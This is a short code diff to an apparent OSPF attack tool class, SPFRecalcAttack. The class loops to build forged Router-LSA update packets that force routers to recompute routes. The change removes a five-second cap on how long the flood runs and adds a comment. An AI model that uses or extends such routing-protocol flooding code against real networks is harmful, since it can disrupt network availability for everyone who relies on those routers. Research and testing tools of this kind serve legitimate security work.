@@ -20,10 +20,10 @@ class SPFRecalcAttack(BaseAttack):
         from ospf_attack.network.adapter import get_local_ip
         src_ip = get_local_ip(self.config.iface)
         seq = 0x80000001
-        deadline = time.time() + min(self.config.duration, 5)
+        deadline = time.time() + self.config.duration
         while time.time() < deadline:
             lsa = build_lsa_header(
-                lsa_type=1, link_state_id=self.config.router_id,
+                lsa_type=1, link_state_id=self.config.router_id,  # Router-LSA
                 advertising_router=self.config.router_id, sequence=seq, age=0,
             )
             pkt = build_lsu_packet(
